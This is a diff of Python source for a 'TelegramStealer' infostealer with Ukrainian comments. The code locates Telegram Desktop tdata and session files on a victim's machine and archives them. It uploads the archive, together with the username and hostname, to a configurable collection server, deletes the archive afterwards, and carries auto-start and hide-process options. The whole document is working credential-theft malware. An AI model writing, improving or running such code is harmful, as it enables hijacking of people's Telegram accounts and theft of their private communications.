@@ -2,142 +2,165 @@
 import os
 import sys
 import json
-import zipfile
-import requests
 import platform
 from pathlib import Path
-import logging
+import zipfile
 import requests
-
+import tempfile
+import logging
 
 class TelegramStealer:
-    def __init__(self, config):
-        self.config = config
-        self.collected_data = []
+    def __init__(self, config_path="config.json"):
+        self.config = self.load_config(config_path)
         self.setup_logging()
+        
+    def load_config(self, config_path):
+        """Завантаження конфігурації"""
+        try:
+            with open(config_path, 'r', encoding='utf-8') as f:
+                return json.load(f)
+        except:
+            return {
+                "server_url": "http://localhost:5000/api/upload",
+                "admin_id": "1", 
+                "target_admin": "admin",
+                "features": ["tdata", "sessions"],
+                "auto_start": True,
+                "hide_process": True
+            }
     
     def setup_logging(self):
+        """Налаштування логування"""
         logging.basicConfig(
             level=logging.INFO,
             format='%(asctime)s - %(levelname)s - %(message)s'
         )
         self.logger = logging.getLogger(__name__)
     
-    def steal_telegram_data(self):
-        """Пошук Telegram даних"""
-        try:
-            # Шляхи до Telegram
-            telegram_paths = self.get_telegram_paths()
-            
-            for path_name, path in telegram_paths.items():
-                if path and os.path.exists(path):
-                    self.logger.info(f"Searching in {path_name}: {path}")
-                    self.collect_from_path(path, path_name)
-                else:
-                    self.logger.warning(f"Path not found: {path_name}")
-                    
-        except Exception as e:
-            self.logger.error(f"Error stealing Telegram data: {e}")
-    
-    def get_telegram_paths(self):
-        """Отримання шляхів до Telegram"""
+    def find_telegram_paths(self):
+        """Пошук шляхів до Telegram Desktop"""
         system = platform.system()
-        paths = {}
+        paths = []
         
         if system == "Windows":
-            # Windows paths
             appdata = os.getenv('APPDATA')
-            local_appdata = os.getenv('LOCALAPPDATA')
+            telegram_desktop = os.path.join(appdata, 'Telegram Desktop', 'tdata')
             
-            # Telegram Desktop
-            paths['telegram_desktop'] = os.path.join(appdata, 'Telegram Desktop', 'tdata')
-            paths['telegram_android'] = os.path.join(local_appdata, 'Telegram', 'Telegram Data')
-            
-        elif system == "Darwin":  # macOS
-            home = str(Path.home())
-            paths['telegram_desktop'] = os.path.join(home, 'Library', 'Application Support', 'Telegram Desktop', 'tdata')
-            paths['telegram_android'] = os.path.join(home, 'Library', 'Application Support', 'Telegram')
-            
-        else:  # Linux
-            home = str(Path.home())
-            paths['telegram_desktop'] = os.path.join(home, '.local', 'share', 'TelegramDesktop', 'tdata')
-            paths['telegram_android'] = os.path.join(home, '.local', 'share', 'Telegram')
+            if os.path.exists(telegram_desktop):
+                paths.append(('telegram_desktop', telegram_desktop))
+                self.logger.info(f"Found Telegram Desktop: {telegram_desktop}")
+            else:
+                self.logger.warning(f"Telegram Desktop not found: {telegram_desktop}")
         
         return paths
     
-    def collect_from_path(self, path, path_name):
-        """Збір даних з шляху"""
+    def collect_data(self, paths):
+        """Збір даних згідно з обраними функціями"""
+        collected_files = []
+        features = self.config.get('features', [])
+        
+        for source_name, path in paths:
+            self.logger.info(f"Scanning {source_name}: {path}")
+            
+            try:
+                if 'tdata' in features:
+                    collected_files.extend(self.collect_tdata(path, source_name))
+                
+                if 'sessions' in features:
+                    collected_files.extend(self.collect_sessions(path, source_name))
+                    
+            except Exception as e:
+                self.logger.error(f"Error scanning {path}: {e}")
+        
+        return collected_files
+    
+    def collect_tdata(self, tdata_path, source_name):
+        """Збір tdata файлів"""
+        collected = []
+        
         try:
-            for root, dirs, files in os.walk(path):
+            for root, dirs, files in os.walk(tdata_path):
                 for file in files:
                     file_path = os.path.join(root, file)
                     
-                    # Збираємо тільки важливі файли
-                    if self.is_important_file(file_path):
-                        self.collect_file(file_path, path_name)
-                        
+                    # Збираємо тільки важливі tdata файли
+                    if self.is_tdata_file(file_path):
+                        try:
+                            with open(file_path, 'rb') as f:
+                                content = f.read()
+                            
+                            collected.append({
+                                'path': file_path,
+                                'source': source_name,
+                                'content': content,
+                                'size': len(content),
+                                'type': 'tdata'
+                            })
+                            
+                            self.logger.info(f"Collected tdata: {os.path.basename(file_path)}")
+                            
+                        except Exception as e:
+                            self.logger.error(f"Error reading {file_path}: {e}")
+                            
         except Exception as e:
-            self.logger.error(f"Error collecting from {path}: {e}")
+            self.logger.error(f"Error walking tdata {tdata_path}: {e}")
+        
+        return collected
     
-    def is_important_file(self, file_path):
-        """Перевірка чи файл важливий"""
-        important_extensions = ['.session', '.dat', '.json', '.key', 'map']
-        important_names = ['tdata', 'D877', 'D877F783', 'user_data']
+    def collect_sessions(self, tdata_path, source_name):
+        """Збір session файлів"""
+        collected = []
         
-        filename = os.path.basename(file_path)
-        
-        # Перевірка розширення
-        if any(filename.endswith(ext) for ext in important_extensions):
-            return True
-        
-        # Перевірка імені
-        if any(name in filename for name in important_names):
-            return True
-            
-        # Перевірка шляху
-        if 'tdata' in file_path.lower():
-            return True
-            
-        return False
-    
-    def collect_file(self, file_path, source):
-        """Додавання файлу до колекції"""
         try:
-            file_size = os.path.getsize(file_path)
-            
-            self.collected_data.append({
-                'path': file_path,
-                'source': source,
-                'size': file_size,
-                'content': self.read_file_safely(file_path)
-            })
-            
-            self.logger.info(f"Collected: {file_path} ({file_size} bytes)")
-            
+            for root, dirs, files in os.walk(tdata_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    
+                    # Шукаємо session файли
+                    if file.endswith('.session') or file.endswith('.session-journal'):
+                        try:
+                            with open(file_path, 'rb') as f:
+                                content = f.read()
+                            
+                            collected.append({
+                                'path': file_path,
+                                'source': source_name,
+                                'content': content,
+                                'size': len(content),
+                                'type': 'session'
+                            })
+                            
+                            self.logger.info(f"Collected session: {os.path.basename(file_path)}")
+                            
+                        except Exception as e:
+                            self.logger.error(f"Error reading {file_path}: {e}")
+                            
         except Exception as e:
-            self.logger.error(f"Error collecting file {file_path}: {e}")
+            self.logger.error(f"Error walking sessions {tdata_path}: {e}")
+        
+        return collected
     
-    def read_file_safely(self, file_path):
-        """Безпечне читання файлу"""
-        try:
-            with open(file_path, 'rb') as f:
-                return f.read()
-        except:
-            return b''
+    def is_tdata_file(self, file_path):
+        """Перевірка чи файл є важливим tdata файлом"""
+        important_names = ['D877', 'map', 'key_datas', 'user_data', 'usertag']
+        filename = os.path.basename(file_path).lower()
+        
+        return any(name in filename for name in important_names)
     
-    def create_archive(self):
+    def create_zip_archive(self, collected_files):
         """Створення ZIP архіву"""
         try:
-            archive_path = 'collected_data.zip'
+            with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as tmp_file:
+                archive_path = tmp_file.name
             
             with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 # Додаємо конфігурацію
-                config_data = json.dumps(self.config, indent=2)
-                zipf.writestr('config.json', config_data)
+                zipf.writestr('config.json', json.dumps(self.config, indent=2))
                 
                 # Додаємо файли
-                for item in self.collected_data:
-                    arcname = f"data/{item['source']}/{os.path.basename(item['path'])}"
+                for item in collected_files:
+                    folder = item['type']
+                    arcname = f"{folder}/{os.path.basename(item['path'])}"
                     zipf.writestr(arcname, item['content'])
             
             self.logger.info(f"Archive created: {archive_path}")
@@ -148,13 +171,20 @@ class TelegramStealer:
             return None
     
     def send_to_server(self, archive_path):
-        """Відправка даних на сервер"""
+        """Відправка на сервер"""
         try:
             with open(archive_path, 'rb') as f:
                 files = {'file': (os.path.basename(archive_path), f, 'application/zip')}
                 data = {
                     'admin_id': self.config.get('admin_id'),
-                    'client_id': self.get_client_info()
+                    'client_id': json.dumps({
+                        'system': platform.system(),
+                        'username': os.getenv('USERNAME') or os.getenv('USER'),
+                        'hostname': platform.node(),
+                        'features': self.config.get('features', []),
+                        'auto_start': self.config.get('auto_start', False),
+                        'hide_process': self.config.get('hide_process', False)
+                    })
                 }
                 
                 response = requests.post(
@@ -175,35 +205,42 @@ class TelegramStealer:
             self.logger.error(f"Error sending data: {e}")
             return False
     
-    def get_client_info(self):
-        """Отримання інформації про клієнта"""
-        return {
-            'system': platform.system(),
-            'machine': platform.machine(),
-            'username': os.getenv('USERNAME') or os.getenv('USER'),
-            'hostname': platform.node()
-        }
-    
     def run(self):
         """Головна функція"""
-        self.logger.info("Starting Telegram stealer...")
+        self.logger.info("Starting Telegram Stealer...")
+        self.logger.info(f"Features: {self.config.get('features', [])}")
+        self.logger.info(f"Auto start: {self.config.get('auto_start', False)}")
+        self.logger.info(f"Hide process: {self.config.get('hide_process', False)}")
         
-        # Збираємо дані
-        self.steal_telegram_data()
-        
-        if not self.collected_data:
-            self.logger.warning("No data collected")
+        # Пошук Telegram
+        paths = self.find_telegram_paths()
+        if not paths:
+            self.logger.warning("No Telegram installations found")
             return False
         
-        # Створюємо архів
-        archive_path = self.create_archive()
+        self.logger.info(f"Found {len(paths)} Telegram installation(s)")
+        
+        # Збір даних
+        collected_files = self.collect_data(paths)
+        if not collected_files:
+            self.logger.warning("No files collected")
+            return False
+        
+        # Статистика по типах
+        tdata_count = len([f for f in collected_files if f['type'] == 'tdata'])
+        session_count = len([f for f in collected_files if f['type'] == 'session'])
+        
+        self.logger.info(f"Collected {len(collected_files)} files (tdata: {tdata_count}, sessions: {session_count})")
+        
+        # Створення архіву
+        archive_path = self.create_zip_archive(collected_files)
         if not archive_path:
             return False
         
-        # Відправляємо на сервер
+        # Відправка на сервер
         success = self.send_to_server(archive_path)
         
-        # Чистимо за собою
+        # Очистка
         try:
             if os.path.exists(archive_path):
                 os.remove(archive_path)
@@ -213,30 +250,22 @@ class TelegramStealer:
         return success
 
 def main():
-    """Точка входу для стіллера"""
+    """Точка входу"""
     try:
-        # Завантажуємо конфігурацію
-        config_path = 'config.json'
-        if os.path.exists(config_path):
-            with open(config_path, 'r') as f:
-                config = json.load(f)
-        else:
-            # Конфігурація за замовчуванням (для тесту)
-            config = {
-                'server_url': 'http://localhost:5000/api/upload',
-                'admin_id': '1',
-                'target_admin': 'admin'
-            }
-        
-        # Запускаємо стілер
-        stealer = TelegramStealer(config)
+        stealer = TelegramStealer()
         success = stealer.run()
         
-        sys.exit(0 if success else 1)
+        if success:
+            print("✅ Stealer completed successfully!")
+        else:
+            print("❌ Stealer failed!")
+            
+        # Пауза для демонстрації
+        input("Press Enter to exit...")
         
     except Exception as e:
-        logging.error(f"Stealer error: {e}")
-        sys.exit(1)
+        print(f"💥 Error: {e}")
+        input("Press Enter to exit...")
 
 if __name__ == "__main__":
     main()
